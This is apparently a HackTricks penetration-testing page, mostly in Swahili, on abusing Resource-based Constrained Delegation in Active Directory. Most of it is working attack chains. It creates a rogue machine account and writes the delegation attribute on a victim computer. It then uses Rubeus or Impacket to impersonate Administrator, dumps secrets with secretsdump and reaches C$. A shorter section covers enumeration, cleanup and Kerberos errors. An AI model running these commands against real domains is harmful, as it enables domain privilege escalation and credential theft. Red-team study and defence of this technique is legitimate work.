# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Msingi wa Resource-based Constrained Delegation

Hii ni sawa na [Constrained Delegation](constrained-delegation.md) ya msingi lakini **badala** ya kutoa ruhusa kwa **kitu** kuweza **kujifanya mtumiaji yeyote dhidi ya mashine**. Resource-based Constrained Delegation **inasanifisha** katika **kitu ambacho kinaweza kujifanya mtumiaji yeyote dhidi yake**.

Katika kesi hii, kitu kilichozuiliwa kitakuwa na sifa inayoitwa _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ yenye jina la mtumiaji ambaye anaweza kujifanya mtumiaji mwingine dhidi yake.

Tofauti nyingine muhimu kutoka kwa Constrained Delegation hii hadi delegations nyingine ni kwamba mtumiaji yeyote mwenye **ruhusa za kuandika juu ya akaunti ya mashine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) anaweza kuweka **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (Katika aina nyingine za Delegation ulihitaji ruhusa za admin wa domain).

### Dhana Mpya

Katika Constrained Delegation ilisemwa kwamba bendera ya **`TrustedToAuthForDelegation`** ndani ya thamani ya _userAccountControl_ ya mtumiaji inahitajika ili kutekeleza **S4U2Self.** Lakini hiyo si kweli kabisa.\
Ukweli ni kwamba hata bila thamani hiyo, unaweza kutekeleza **S4U2Self** dhidi ya mtumiaji yeyote ikiwa wewe ni **huduma** (una SPN) lakini, ikiwa una **`TrustedToAuthForDelegation`** TGS iliyorejeshwa itakuwa **Forwardable** na ikiwa **huna** bendera hiyo TGS iliyorejeshwa **haitakuwa** **Forwardable**.

Hata hivyo, ikiwa **TGS** iliyotumika katika **S4U2Proxy** **SIO Forwardable** kujaribu kutumia **Constrained Delegation ya msingi** hakutafanya kazi. Lakini ikiwa unajaribu kutumia **Resource-Based constrained delegation, itafanya kazi**.

### Muundo wa Shambulio

> Ikiwa una **ruhusa sawa za kuandika** juu ya akaunti ya **Kompyuta** unaweza kupata **ufikiaji wa ruhusa** katika mashine hiyo.

Fikiria kwamba mshambuliaji tayari ana **ruhusa sawa za kuandika juu ya kompyuta ya mwathirika**.

1. Mshambuliaji **anachafua** akaunti ambayo ina **SPN** au **anaunda moja** (“Huduma A”). Kumbuka kwamba **mtumiaji yeyote** _Admin User_ bila ruhusa nyingine maalum anaweza **kuunda** hadi vitu 10 vya Kompyuta (**_MachineAccountQuota_**) na kuviweka SPN. Hivyo mshambuliaji anaweza tu kuunda kitu cha Kompyuta na kuweka SPN.
2. Mshambuliaji **anatumia ruhusa zake za KUANDIKA** juu ya kompyuta ya mwathirika (HudumaB) ili kuunda **resource-based constrained delegation ili kuruhusu HudumaA kujifanya mtumiaji yeyote** dhidi ya kompyuta hiyo ya mwathirika (HudumaB).
3. Mshambuliaji anatumia Rubeus kutekeleza **shambulio kamili la S4U** (S4U2Self na S4U2Proxy) kutoka Huduma A hadi Huduma B kwa mtumiaji **mwenye ufikiaji wa ruhusa kwa Huduma B**.
1. S4U2Self (kutoka akaunti ya SPN iliyochafuliwa/iliyoundwa): Omba **TGS ya Msimamizi kwangu** (Sio Forwardable).
2. S4U2Proxy: Tumia **TGS isiyo Forwardable** ya hatua iliyopita kuomba **TGS** kutoka **Msimamizi** hadi **kompyuta ya mwathirika**.
3. Hata kama unatumia TGS isiyo Forwardable, kwani unatumia Resource-based constrained delegation, itafanya kazi.
4. Mshambuliaji anaweza **kupitisha tiketi** na **kujifanya** mtumiaji ili kupata **ufikiaji kwa HudumaB ya mwathirika**.

Ili kuangalia _**MachineAccountQuota**_ ya domain unaweza kutumia:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Shambulio

### Kuunda Kituo cha Kompyuta

Unaweza kuunda kituo cha kompyuta ndani ya eneo kutumia **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Kuunda Uwakilishi wa Kizazi Kizuri Kulingana na Rasilimali

**Kutumia moduli ya activedirectory PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Kutumia powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Kufanya shambulio kamili la S4U (Windows/Rubeus)

Kwanza kabisa, tuliumba kitu kipya cha Kompyuta chenye nenosiri `123456`, hivyo tunahitaji hash ya nenosiri hilo:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Hii itachapisha hash za RC4 na AES za akaunti hiyo.\
Sasa, shambulio linaweza kufanywa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Unaweza kuunda tiketi zaidi za huduma zaidi kwa kuuliza mara moja ukitumia param ya `/altservice` ya Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Kumbuka kwamba watumiaji wana sifa inayoitwa "**Haiwezi kuwakilishwa**". Ikiwa mtumiaji ana sifa hii kuwa Kweli, huwezi kumwakilisha. Mali hii inaweza kuonekana ndani ya bloodhound.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Ikiwa unafanya kazi kutoka Linux, unaweza kutekeleza mnyororo kamili wa RBCD ukitumia zana rasmi za Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Ikiwa LDAP signing/LDAPS imewekwa, tumia `impacket-rbcd -use-ldaps ...`.
- Prefer AES keys; maeneo mengi ya kisasa yanakataza RC4. Impacket na Rubeus zote zinasaidia mchakato wa AES pekee.
- Impacket inaweza kuandika upya `sname` ("AnySPN") kwa baadhi ya zana, lakini pata SPN sahihi kila wakati inapowezekana (mfano, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accessing

Amri ya mwisho itatekeleza **shambulio kamili la S4U na itachoma TGS** kutoka kwa Administrator hadi mwenyeji wa mwathirika katika **kumbukumbu**.\
Katika mfano huu, ilihitajika TGS kwa huduma ya **CIFS** kutoka kwa Administrator, hivyo utaweza kufikia **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuse different service tickets

Learn about the [**available service tickets here**](silver-ticket.md#available-services).

## Enumerating, auditing and cleanup

### Enumerate computers with RBCD configured

PowerShell (decoding the SD to resolve SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (soma au futa kwa amri moja):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (ondoa sifa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Makosa ya Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Hii inamaanisha kwamba kerberos imewekwa ili isitumie DES au RC4 na unatoa tu hash ya RC4. Toa kwa Rubeus angalau hash ya AES256 (au toa tu hash za rc4, aes128 na aes256). Mfano: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Hii inamaanisha kwamba wakati wa kompyuta ya sasa ni tofauti na wa DC na kerberos haifanyi kazi ipasavyo.
- **`preauth_failed`**: Hii inamaanisha kwamba jina la mtumiaji lililotolewa + hash hazifanyi kazi kuingia. Huenda umesahau kuweka "$" ndani ya jina la mtumiaji unapozalisha hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Hii inaweza kumaanisha:
- Mtumiaji unayejaribu kujifanya siwezi kufikia huduma inayotakiwa (kwa sababu huwezi kujifanya au kwa sababu hana ruhusa za kutosha)
- Huduma iliyoulizwa haipo (ikiwa unahitaji tiketi kwa winrm lakini winrm haifanyi kazi)
- Kompyuta ya uwongo iliyoundwa imepoteza ruhusa zake juu ya seva iliyo hatarini na unahitaji kuzirudisha.
- Unatumia KCD ya kawaida; kumbuka RBCD inafanya kazi na tiketi zisizoweza kuhamasishwa za S4U2Self, wakati KCD inahitaji tiketi zinazoweza kuhamasishwa.

## Maelezo, relays na mbadala

- Unaweza pia kuandika RBCD SD juu ya AD Web Services (ADWS) ikiwa LDAP imechujwa. Tazama:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Mnyororo wa relay wa Kerberos mara nyingi huishia katika RBCD ili kufikia SYSTEM ya ndani kwa hatua moja. Tazama mifano halisi ya mwisho hadi mwisho:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Marejeleo

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (rasmi): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Karatasi ya haraka ya Linux yenye sintaksia ya hivi karibuni: https://tldrbins.github.io/rbcd/


{{#include ../../banners/hacktricks-training.md}}
